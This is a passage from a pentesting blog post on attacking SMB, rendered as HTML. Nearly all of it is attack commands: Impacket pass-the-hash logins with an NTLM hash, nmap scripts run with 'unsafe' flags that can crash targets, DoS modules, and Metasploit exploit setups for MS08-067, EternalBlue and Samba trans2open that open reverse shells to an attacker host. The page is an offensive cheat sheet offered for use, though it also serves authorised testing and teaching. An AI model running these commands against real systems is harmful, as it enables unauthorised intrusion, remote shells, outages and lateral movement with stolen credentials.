python psexec.py secybr.local/0xhav0c@10.10.x.x <span class="nt">-hashes</span> 00000000000000000000000000000000:4a09d6777d034c2a5fced85d044a98e3
python smbexec.py secybr.local/0xhav0c@10.10.x.x <span class="nt">-hashes</span> 00000000000000000000000000000000:4a09d6777d034c2a5fced85d044a98e3
python wmiexec.py secybr.local/0xhav0c@10.10.x.x <span class="nt">-hashes</span> 00000000000000000000000000000000:4a09d6777d034c2a5fced85d044a98e3
</pre></table></code></div></div><h2 id="common-smb-vulnerabilities"><span class="mr-2">Common SMB Vulnerabilities</span><a href="#common-smb-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="dos-vulnerabilities-using-this-service-can-be-detected"><span class="mr-2">DOS vulnerabilities using this service can be detected.</span><a href="#dos-vulnerabilities-using-this-service-can-be-detected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#MS09-050: Microsoft Windows SMB2 _Smb2ValidateProviderCallback() Vulnerability (975497) (uncredentialed check) [CVE-2009-2526]</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-cve2009-3103 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-cve2009-3103 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x
msf <span class="o">&gt;</span> use auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh 10.10.x.x
msf <span class="o">&gt;</span> use exploit/windows/smb/ms09_050_smb2_negotiate_func_index 10.10.x.x

<span class="c">#MS10-006: Vulnerabilities in SMB Client Could Allow Remote Code Execution (978251)</span>
msf <span class="o">&gt;</span> use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop

<span class="c">#MS10-054: Vulnerabilities in SMB Server Could Allow Remote Code Execution (982214) [CVE-2010-2551] [CVE-2010-2552] (Remote Memory Corruption. Result is BSOD -&gt; DANGEROUS)</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms10-054 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x

<span class="c">#Service regsvc vulnerability [CVE-2010-2550]</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-regsvc-dos 10.10.x.x

<span class="c">#SMB DOS</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-flood <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>Domain,smbuser<span class="o">=</span>Username,smbpass<span class="o">=</span>Password 10.10.x.x
</pre></table></code></div></div><h3 id="various-vulnerable-systems-using-this-service-can-be-detected"><span class="mr-2">Various vulnerable systems using this service can be detected.</span><a href="#various-vulnerable-systems-using-this-service-can-be-detected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="c">#MS03-026: Buffer Overrun In RPC Interface Could Allow Code Execution (823980) [CAN-2003-0352]</span>
Exploit-DB: 66.c

<span class="c">#MS06-025: Vulnerability in Routing and Remote Access Could Allow Remote Code Execution (911280) [CVE-2006-2370] (Buffer overflow in RRAS)</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms06-025 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x

<span class="c">#MS06-040: Vulnerability in Server Service Could Allow Remote Code Execution (921883) (uncredentialed check) [CVE-2006-3439]</span>
use exploit/windows/smb/ms06_040_netapi <span class="k">***</span>

<span class="c">#MS07-029: Vulnerability in Windows DNS RPC Interface Could Allow Remote Code Execution (935966) [CVE-2007-1748] (Buffer overflow which can crash the RPC intrface in the DNS Server)</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms07-029 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x

<span class="c">#MS08-067: Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution (958644) (uncredentialed check) [CVE-2008-4250] (Buffer overflow/RCE. Dangerous, can crash the target)</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms08-067 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-conficker <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1  10.10.x.x <span class="c"># (dangerous, can crash target)</span>
Exploit-DB: 7132.py <span class="k">***</span>
msf <span class="o">&gt;</span> use exploit/windows/smb/ms08_067_netapi <span class="k">***</span>

<span class="c">#MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) [CVE-2010-2729] (Print vulnerability. Safe and can\'t crash the target)</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms10-061 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x

<span class="c">#MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (uncredentialed check) [CVE-2017-0143] (RCE, just checking if vulnerable)</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms17-010 <span class="nt">--script-args</span> <span class="nv">unsafe</span><span class="o">=</span>1 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb2-vuln-uptime <span class="nt">--script-args</span> smb2-vuln-uptime.skip-os<span class="o">=</span><span class="nb">true </span>10.10.x.x
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010
msf <span class="o">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue
msf <span class="o">&gt;</span> use exploit/windows/smb/ms17_010_psexec

<span class="c">#(IMPORTANT MS17_010_PSEXEC is a staged payload, means you need meterpreter !)</span>
<span class="c">#(IMPORTANT 2, if object can\'t be found, try to modify your target !)</span>
<span class="nb">set </span>SHARE ADMIN<span class="err">$</span>
<span class="nb">set </span>SMBDomain secybr.local
<span class="nb">set </span>ALLOW_GUEST <span class="nb">true
set </span>LPORT 445
<span class="nb">set </span>LHOST 10.10.y.y
<span class="nb">set </span>RHOST 10.10.x.x
<span class="nb">set </span>TARGET 3       <span class="c">#(TARGET 1 = PowerShell / TARGET 2 = Native / TARGET 3 = MOF =&gt; share ADMIN$)</span>
<span class="nb">set </span>PAYLOAD windows/shell/reverse_tcp
<span class="nb">set </span>VERBOSE <span class="nb">true
set </span>DBGTRACE <span class="nb">true
set </span>EXITFUNC thread
exploit <span class="nt">-j</span>

<span class="c">#Trans2open Exploitation</span>
<span class="c"># Samba 2.2.X are usually vulnerable to trans2open</span>
msf <span class="o">&gt;</span> use exploit/linux/samba/trans2open
<span class="nb">set </span>VERBOSE <span class="nb">true
set </span>PAYLOAD linux/x86/shell_reverse_tcp
<span class="nb">set </span>RHOST 10.10.x.x
<span class="nb">set </span>LPORT 443
<span class="nb">set </span>LHOST IP
exploit <span class="nt">-j</span> <span class="nt">-z</span>

<span class="c">#Samba 3.4.5 Symlink Directory Traversal</span>
<span class="c"># You can mount the root fiilesystem to a share you can access</span>
https://www.exploit-db.com/exploits/33599

<span class="c"># Using metasploit</span>
https://www.exploit-db.com/exploits/33598
msf <span class="o">&gt;</span> use auxiliary/admin/smb/samba_symlink/traversal
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting-protocols/'>pentesting protocols</a>, <a href='/categories/smb/'>smb</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/best-practicies/" class="post-tag no-text-decoration" >best practicies</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SMB+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&url=https%3A%2F%2Fsecybr.com%2Fposts%2Fsmb-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SMB+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&u=https%3A%2F%2Fsecybr.com%2Fposts%2Fsmb-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsecybr.com%2Fposts%2Fsmb-pentesting-best-practices%2F&text=SMB+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/subdomain-enumeration-methods/">Subdomain Enumeration Methods</a><li><a href="/posts/shodan-tutorials-for-best-practicies/">Shodan.io Tutorials for Best Practices</a><li><a href="/posts/collecting-target-email-address/">Collecting Target Email Addresses</a><li><a href="/posts/evasion-tactics-for-scanning-targets/">Evasion Tactics For Scanning Targets (Active Scan)</a><li><a href="/posts/dumping-lsass-without-mimikatz/">Dumping LSASS Without Mimikatz</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ftp-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FTP Pentesting Best Practices</h3><div class="text-muted small"><p> FTP FTP usually uses port 21 What is FTP? FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protoco...</p></div></div></a></div><div class="card"> <a href="/posts/telnet-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Telnet Pentesting Best Practices</h3><div class="text-muted small"><p> Telnet Telnet usually uses port 23,992 What is Telnet? Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication c...</p></div></div></a></div><div class="card"> <a href="/posts/finger-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654376400" data-df="ll" > Jun 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Finger Pentesting Best Practices</h3><div class="text-muted small"><p> Finger Finger usually uses port 79 What is Finger? Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly othe...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/snmp-pentesting-best-practicies/" class="btn btn-outline-primary" prompt="Older"><p>SNMP Pentesting Best Practicies</p></a> <a href="/posts/redis-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Newer"><p>Redis Pentesting Best Practices</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://secybr.com/posts/smb-pentesting-best-practices/'; this.page.identifier = '/posts/smb-pentesting-best-practices/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://secybr-com.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><div class="row justify-content-center border-top"> <small class="my-4">Powered by <a href="https://twitter.com/0xhav0c" target="_blank" rel="noopener noreferrer">0xhav0c</a> © 2022 - <a href="/privacy-policy/">Privacy Policy</a> </small></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-XBEEHR73W1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-XBEEHR73W1'); }); </script>
